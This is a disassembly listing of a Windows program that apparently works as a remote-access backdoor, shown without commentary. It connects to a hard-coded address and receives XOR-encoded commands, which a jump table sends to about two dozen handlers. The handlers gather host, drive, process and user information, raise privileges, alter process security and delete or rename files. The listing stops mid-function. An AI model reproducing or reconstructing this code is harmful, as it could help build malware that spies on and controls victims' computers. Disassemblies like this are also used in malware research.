je r-xdata
sub_402482
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ _itoa@IAT ]
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call edi
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call strcat
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call strcpy
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x28
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
leave
retn
push rw-data
push esi
call strcat
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call edi
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x24
sub_402583
push ebp
mov ebp esp
mov eax 0x2008
call sub_4057b0
push ebx
push esi
xor ebx ebx
push edi
mov edi [ __import_lookup_table_0(KERNEL32:Sleep) ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
lea esi [ ebp - 0x2008 ]
or eax 0xffffffff
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call edi
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
cmp eax 0x1388
jg r-xdata
and [ ebp + ebx - 0x2007 ] 0x0
lea eax [ ebp - 0x2008 ]
push rw-data
push eax
call [ __import_lookup_table_3(MSVCRT:strstr) ]
neg eax
sbb eax eax
pop ecx
and eax 0x2
pop ecx
dec eax
jmp r-xdata
inc ebx
inc esi
cmp ebx 0x2000
ja r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call edi
jmp r-xdata
push 0x0
push 0x1
push esi
push [ ebp + 0x8 ]
call [ recv@IAT ]
test eax eax
je r-xdata
sub_402635
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
test edx edx
mov [ eax ] edx
jle r-xdata
retn
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
sub eax ecx
mov esi edx
mov dl [ eax + ecx ]
xor dl 0x23
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop esi
sub_40265e
push ebp
mov ebp esp
sub esp 0x104
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xff
push eax
push rw-data
call [ GetComputerNameA@IAT ]
mov eax [ ebp - 0x4 ]
push 0xff
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x104 ]
push eax
call [ gethostname@IAT ]
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
push eax
jmp r-xdata
push rw-data
call strcpy
pop ecx
pop ecx
leave
retn
sub_4026f0
push ebp
mov ebp esp
sub esp 0x124
push ebx
mov ebx [ ioctlsocket@IAT ]
push esi
push edi
xor edi edi
push 0x1
cmp [ rw-data ] edi
pop esi
jne r-xdata
push edi
push esi
push 0x2
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
push edi
push esi
push 0x2
mov [ rw-data ] edi
call [ socket@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call ebx
mov eax [ rw-data ]
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x120 ] eax
mov ax [ rw-data ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
call [ htons@IAT ]
push rw-data
mov [ ebp - 0x1a ] ax
call [ inet_addr@IAT ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ connect@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ select@IAT ]
test eax eax
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call ebx
mov eax [ rw-data ]
push 0x51
mov [ ebp - 0xc ] 0x3c
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x120 ] eax
mov [ ebp - 0x124 ] esi
mov [ ebp - 0x1c ] 0x2
call [ htons@IAT ]
mov [ ebp - 0x1a ] ax
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ rw-data ]
call [ connect@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x124 ]
push edi
push eax
mov eax [ rw-data ]
push edi
inc eax
push eax
call [ select@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ rw-data ]
call [ closesocket@IAT ]
mov [ rw-data ] esi
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
call sub_402d9c
test eax eax
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push edi
push edi
push sub_402b90
push edi
push edi
call [ CreateThread@IAT ]
cmp eax edi
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
mov eax esi
sub_4028ac
push ebp
mov ebp esp
sub esp 0x100
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov edi eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
push [ rw-data ]
push [ rw-data ]
push [ rw-data ]
call memcpy
mov eax [ rw-data ]
xor esi esi
mov [ rw-data ] eax
add esp 0xc
movsx eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
call edi
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0xffffffbe
cmp eax 0x24
ja r-xdata
cmp [ rw-data ] esi
push 0x1
pop edi
mov [ rw-data ] edi
je r-xdata
jmp [ eax * 4 + jump_table_402a5a ]
mov eax edi
pop edi
pop esi
leave
retn
mov [ rw-data ] esi
mov esi rw-data
push esi
mov [ ebp - 0x100 ] 0x5a
call strlen
add eax 0x5
push esi
mov [ ebp - 0xff ] eax
lea eax [ ebp - 0xfb ]
push eax
call strcpy
push esi
call strlen
add eax 0x5
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_401ed3
add esp 0x18
call sub_403943
jmp r-xdata
call sub_403749
jmp r-xdata
call sub_403767
jmp r-xdata
call sub_40372a
jmp r-xdata
call sub_4036c9
jmp r-xdata
call sub_403388
jmp r-xdata
call sub_403822
jmp r-xdata
call sub_403e89
jmp r-xdata
call sub_403859
jmp r-xdata
call sub_403908
jmp r-xdata
call sub_4038e8
jmp r-xdata
call sub_4042ba
jmp r-xdata
push 0x4e
call sub_4042cd
pop ecx
jmp r-xdata
call sub_4043d2
jmp r-xdata
call sub_4043fe
jmp r-xdata
call sub_404312
jmp r-xdata
call sub_404f9e
jmp r-xdata
call sub_4046ae
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
call sub_404eac
call sub_40539c
jmp r-xdata
call sub_40541f
jmp r-xdata
call sub_405457
jmp r-xdata
call sub_4054a5
jmp r-xdata
call sub_4054dd
sub_402aee
push 0x0
push [ rw-data ]
call [ __import_lookup_table_0(KERNEL32:WaitForSingleObject) ]
test eax eax
jne r-xdata
push 0x3e8
call [ __import_lookup_table_0(KERNEL32:Sleep) ]
jmp sub_402aee
push [ rw-data ]
call [ SetEvent@IAT ]
call [ WSACleanup@IAT ]
push 0x1
call [ ExitProcess@IAT ]
sub_402b27
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov ebx eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
call ebx
mov esi eax
mov [ rw-data ] esi
call ebx
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_401b91
mov esi edi
push 0xa
call [ __import_lookup_table_0(KERNEL32:Sleep) ]
jmp r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] edi
call ebx
mov edi eax
sub eax esi
cmp eax 0xea60
jbe r-xdata
sub_402b90
push ebp
mov ebp esp
mov eax 0x2004
call sub_4057b0
push ebx
push esi
mov esi [ ebp - 0x4 ]
xor ebx ebx
push edi
mov edi [ __import_lookup_table_0(KERNEL32:Sleep) ]
mov [ rw-data ] ebx
mov al [ ebp - 0x2004 ]
sub esi 0x5
mov [ rw-data ] al
mov [ rw-data ] ebx
call sub_402ccf
test eax eax
je r-xdata
mov [ rw-data ] bl
push eax
lea eax [ ebp - 0x2004 ]
push eax
push [ rw-data ]
call memcpy
sub esi [ rw-data ]
add esp 0xc
cmp esi ebx
jg r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0x2004 ]
push 0x5
push eax
call sub_402d30
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
pop edi
pop esi
mov [ rw-data ] 0x1
xor eax eax
pop ebx
leave
retn 0x4
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp - 0x2003 ]
cmp esi 0x5
jl r-xdata
push 0x1
call edi
cmp [ rw-data ] ebx
jne r-xdata
cmp esi ebx
jg r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call edi
jmp r-xdata
cmp [ rw-data ] bl
jne r-xdata
cmp [ ebp - 0x2004 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x2004 ]
push esi
push eax
call sub_402d30
pop ecx
cmp eax 0xffffffff
pop ecx
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] bl
jmp r-xdata
mov [ rw-data ] 0x1
cmp [ ebp - 0x2004 ] 0x51
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
jmp r-xdata
sub_402ccf
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ __import_lookup_table_0(KERNEL32:Sleep) ]
xor ebx ebx
test eax eax
jle r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0xd
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push [ rw-data ]
call [ recv@IAT ]
cmp eax 0xffffffff
jne r-xdata
inc ebx
cmp ebx 0x4
jge r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
pop esi
pop ebx
leave
retn
push 0x1
pop eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
sub_402d30
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
mov eax 0x2000
xor esi esi
xor ebx ebx
cmp edi eax
jle r-xdata
test edi edi
jle r-xdata
mov edi eax
mov eax edi
mov eax edi
push 0x0
sub eax esi
push eax
mov eax [ esp + 0x18 ]
add eax esi
push eax
push [ rw-data ]
call [ recv@IAT ]
test eax eax
jg r-xdata
add esi eax
xor ebx ebx
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
push 0x1
call [ __import_lookup_table_0(KERNEL32:Sleep) ]
cmp esi edi
jl r-xdata
sub_402d9c
push ebp
mov ebp esp
sub esp 0x488
and [ ebp - 0x4 ] 0x0
push esi
mov esi rw-data
lea eax [ ebp - 0x283 ]
push esi
push eax
mov [ ebp - 0x288 ] 0x41
call strcpy
push esi
call strlen
mov esi eax
mov eax [ rw-data ]
add esi 0x6
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
lea eax [ ebp - 0x488 ]
push eax
push 0x200
add esi 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x288 ]
push esi
push eax
mov [ ebp - 0x287 ] esi
call sub_401ed3
pop ecx
pop ecx
pop esi
leave
retn
cmp [ ebp - 0x488 ] 0x0
je r-xdata
push ebx
push edi
lea edi [ ebp - 0x488 ]
and [ ebp - 0x88 ] 0x0
xor eax eax
push eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x88 ]
push 0x80
push eax
push edi
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
push edi
call strlen
mov ebx eax
lea eax [ ebp + esi - 0x288 ]
push edi
push eax
inc ebx
call strcpy
add esp 0xc
add esi ebx
push edi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ ebp - 0x8 ] eax
je r-xdata
pop edi
pop ebx
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp + esi - 0x288 ]
push eax
call strcpy
lea eax [ ebp - 0x88 ]
push eax
call strlen
add [ ebp - 0x4 ] ebx
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0x8 ]
add esp 0xc
mov [ ebp + esi - 0x288 ] eax
mov eax [ ebp - 0x4 ]
add esi 0x4
cmp [ ebp + eax - 0x488 ] 0x0
lea edi [ ebp + eax - 0x488 ]
jne r-xdata
sub_402ec8
push ebp
mov ebp esp
sub esp 0x540
push ebx
xor ebx ebx
cmp [ rw-data ] 0x2
push esi
push edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov esi 0x200
lea eax [ ebp - 0x340 ]
push esi
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x33d ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x340 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x340 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x340 ]
push rw-data
push eax
call strcat
add esp 0x20
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov edi [ CloseHandle@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x4 ] edi
je r-xdata
push [ ebp - 0x10 ]
call edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea ecx [ ebp - 0x140 ]
mov [ ebp - 0x140 ] 0x128
push ecx
push eax
call Process32First
pop edi
pop esi
pop ebx
leave
retn
mov esi [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0x8 ] eax
call esi
cmp [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] eax
je r-xdata
push [ ebp - 0x4 ]
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
and [ ebp - 0x540 ] 0x0
cmp [ rw-data ] 0x2
jne r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x540 ]
push eax
call strcpy
pop ecx
pop ecx
push 0x410
push [ ebp - 0x138 ]
call sub_40318f
pop ecx
mov ebx eax
pop ecx
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push ebx
call [ ebp - 0x8 ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x2
push [ ebp - 0x138 ]
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push [ ebp - 0x10 ]
call Process32Next
jmp r-xdata
push ebx
call edi
xor ebx ebx
jmp r-xdata
lea eax [ ebp - 0x540 ]
push esi
push eax
push [ ebp - 0x14 ]
push ebx
call [ ebp - 0xc ]
lea eax [ ebp - 0x540 ]
push eax
call sub_4032cc
pop ecx
call sub_4036e8
call sub_403688
jmp r-xdata
test eax eax
je r-xdata
lea eax [ ebp - 0x340 ]
push eax
lea eax [ ebp - 0x540 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
pop ecx
sub_40308e
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov [ ebp - 0x2c ] ecx
lea ecx [ ebp - 0xc ]
push 0x1
mov [ ebp - 0x10 ] ecx
pop eax
lea ecx [ ebp + 0xc ]
xor ebx ebx
push ecx
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ ebp - 0xc ] al
mov [ ebp - 0xb ] al
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] bl
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x28 ] 0x2
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] eax
mov [ ebp + 0xc ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
push esi
push ebx
push [ ebp + 0xc ]
push ebx
push ebx
push 0x4
push 0x6
push [ ebp + 0x8 ]
call SetSecurityInfo
push [ ebp + 0xc ]
mov esi eax
call [ __import_lookup_table_0(KERNEL32:LocalFree) ]
xor eax eax
cmp esi ebx
sete al
pop esi
jmp r-xdata
pop ebx
leave
retn
sub_40311a
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] 0x1
push eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0xc ]
push 0x0
call [ __import_lookup_table_1(ADVAPI32:LookupPrivilegeValueA) ]
test eax eax
je r-xdata
xor eax eax
leave
retn
push 0x10
lea ecx [ ebp + 0xc ]
pop eax
push ecx
mov [ ebp + 0xc ] eax
push [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push [ ebp + 0x8 ]
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
leave
retn
sub_40318f
push ebp
mov ebp esp
sub esp 0x21c
push ebx
push esi
push edi
mov edi [ OpenProcess@IAT ]
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
push [ ebp + 0xc ]
call edi
cmp eax ebx
mov [ ebp - 0xc ] eax
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
push ebx
push 0x40000
call edi
mov esi [ __import_lookup_table_0(KERNEL32:GetCurrentProcess) ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_40308e
pop ecx
lea eax [ ebp - 0xc ]
pop ecx
push ebx
push ebx
push [ ebp + 0xc ]
push eax
call esi
push eax
push [ ebp - 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x28
call esi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0xc ] ebx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push [ ebp - 0x8 ]
call sub_40311a
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x8 ]
push ebx
push 0x80000
call edi
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x8 ]
call sub_40317a
pop ecx
pop ecx
lea ecx [ ebp + 0x8 ]
mov eax 0x200
push ecx
mov [ ebp + 0x8 ] eax
push eax
lea eax [ ebp - 0x21c ]
push eax
push 0x1
push [ ebp - 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push ebx
push ebx
push ebx
push [ ebp - 0x21c ]
push 0x1
push 0x6
push edi
call SetSecurityInfo
test eax eax
jne r-xdata
push ebx
push ebx
lea eax [ ebp - 0x4 ]
push 0x40000
push eax
call esi
push eax
push edi
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] ebx
sub_4032cc
push ebp
mov ebp esp
sub esp 0x108
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx ] 0x0
je r-xdata
mov esi rw-data
push esi
call strlen
mov edi rw-data
mov [ ebp + 0x8 ] eax
push edi
call strlen
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
push esi
mov esi [ __import_lookup_table_3(MSVCRT:_strnicmp) ]
push ebx
call esi
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push edi
push ebx
call esi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x108 ]
push 0x104
push eax
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax ebx
push eax
push ebx
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
mov eax [ ebp + 0x8 ]
add eax ebx
push eax
lea eax [ ebp - 0x108 ]
push eax
call strcat
lea eax [ ebp - 0x108 ]
push eax
push ebx
call strcpy
add esp 0x18
jmp r-xdata
sub_403388
push ebp
mov ebp esp
mov eax 0x2744
call sub_4057b0
push ebx
push esi
push edi
push 0x5
xor esi esi
cmp [ rw-data ] 0x2
pop ebx
mov [ ebp - 0x2744 ] 0x43
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] esi
jne r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi esi
mov [ ebp - 0x4 ] edi
je r-xdata
push 0x5
pop ebx
mov [ ebp - 0x2743 ] ebx
jmp r-xdata
lea ecx [ ebp - 0x144 ]
mov [ ebp - 0x144 ] 0x128
push ecx
push eax
call Process32First
test eax eax
jne r-xdata
mov esi [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push rw-data
push edi
call esi
push rw-data
push edi
mov [ ebp - 0xc ] eax
call esi
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
je r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edi 0x410
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
push edi
push [ ebp - 0x13c ]
call sub_40318f
pop ecx
mov esi eax
pop ecx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push 0x4
push eax
push esi
call [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0x2744 ]
push ebx
push eax
mov [ ebp - 0x2743 ] ebx
call sub_401ed3
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
cmp [ ebp - 0x13c ] 0x0
jne r-xdata
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x644 ]
push eax
call strcpy
lea eax [ ebp - 0x344 ]
push 0x5c
push eax
mov [ ebp - 0x18 ] 0x100
call [ __import_lookup_table_3(MSVCRT:strrchr) ]
inc eax
push eax
lea eax [ ebp - 0x744 ]
push eax
call strcpy
lea eax [ ebp - 0x744 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcpy
add esp 0x20
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call [ GetUserNameA@IAT ]
lea eax [ ebp - 0x444 ]
push eax
push esi
call sub_404632
pop ecx
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x644 ]
push 0x200
push eax
push [ ebp - 0x14 ]
push esi
call [ ebp - 0x10 ]
lea eax [ ebp - 0x644 ]
push eax
call sub_4032cc
pop ecx
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call strcpy
add esp 0x10
push esi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x444 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x644 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcat
lea eax [ ebp - 0x344 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x344 ]
push eax
lea eax [ ebp + ebx - 0x2744 ]
push eax
call strcpy
lea eax [ ebp - 0x344 ]
push eax
call strlen
lea esi [ ebx + eax + 0x1 ]
mov eax [ ebp - 0x13c ]
mov [ ebp + esi - 0x2744 ] eax
add esi 0x4
lea eax [ ebp - 0x444 ]
push eax
lea eax [ ebp + esi - 0x2744 ]
push eax
call strcpy
lea eax [ ebp - 0x444 ]
push eax
call strlen
lea ebx [ esi + eax + 0x1 ]
mov eax [ ebp - 0x130 ]
add esp 0x30
mov [ ebp + ebx - 0x2744 ] eax
lea eax [ ebp - 0x144 ]
push eax
add ebx 0x4
push [ ebp - 0x8 ]
call Process32Next
test eax eax
jne r-xdata
lea eax [ ebp - 0x644 ]
push rw-data
push eax
call strcpy
pop ecx
pop ecx
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call strcpy
pop ecx
pop ecx
push [ ebp - 0x13c ]
push 0x0
push edi
call [ OpenProcess@IAT ]
mov esi eax
push esi
call [ GetPriorityClass@IAT ]
push esi
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x2
jne r-xdata
sub_403688
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov edi eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
push 0x1
push [ esp + 0x10 ]
call sub_40318f
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
push 0x1
push eax
call edi
jmp r-xdata
pop edi
pop esi
retn
sub_4036e8
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov edi eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
push [ esp + 0xc ]
push 0x0
push 0x1
call [ OpenProcess@IAT ]
test eax eax
je r-xdata
xor eax eax
push 0x1
push eax
call edi
jmp r-xdata
pop edi
pop esi
retn
sub_403767
push ebp
mov ebp esp
sub esp 0x400
push esi
lea eax [ ebp - 0x400 ]
push [ rw-data ]
push eax
call strcpy
lea eax [ ebp - 0x400 ]
push eax
call strlen
add esp 0xc
mov esi eax
mov [ rw-data ] 0x4f
call sub_403c4e
pop esi
leave
retn
lea eax [ ebp - 0x400 ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcpy
mov eax [ rw-data ]
add eax esi
push eax
lea eax [ ebp - 0x200 ]
push eax
call strcat
mov eax [ rw-data ]
add eax esi
push eax
call strlen
add esp 0x14
lea esi [ esi + eax + 0x1 ]
lea eax [ ebp - 0x200 ]
push 0x0
push eax
call [ __import_lookup_table_0(KERNEL32:SetFileAttributesA) ]
mov eax [ rw-data ]
cmp [ eax + esi ] 0x30
jne r-xdata
lea eax [ ebp - 0x200 ]
push 0x4c
push eax
call sub_403c73
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x200 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
inc esi
cmp esi [ rw-data ]
jge r-xdata
sub_403822
mov eax [ rw-data ]
push esi
push eax
mov esi eax
call strlen
mov ecx [ rw-data ]
lea eax [ eax + ecx + 0x1 ]
push eax
push esi
call [ rename@IAT ]
add esp 0xc
neg eax
sbb al al
and al 0xf6
add al 0x4f
mov [ rw-data ] al
call sub_403c4e
pop esi
retn
sub_403859
push ebp
mov ebp esp
push ecx
push ebx
push [ rw-data ]
call strlen
mov ecx [ rw-data ]
push ecx
mov bl [ eax + ecx + 0x1 ]
call strlen
mov ecx [ rw-data ]
push ecx
mov al [ eax + ecx + 0x2 ]
mov [ ebp - 0x1 ] al
call strlen
mov ecx [ rw-data ]
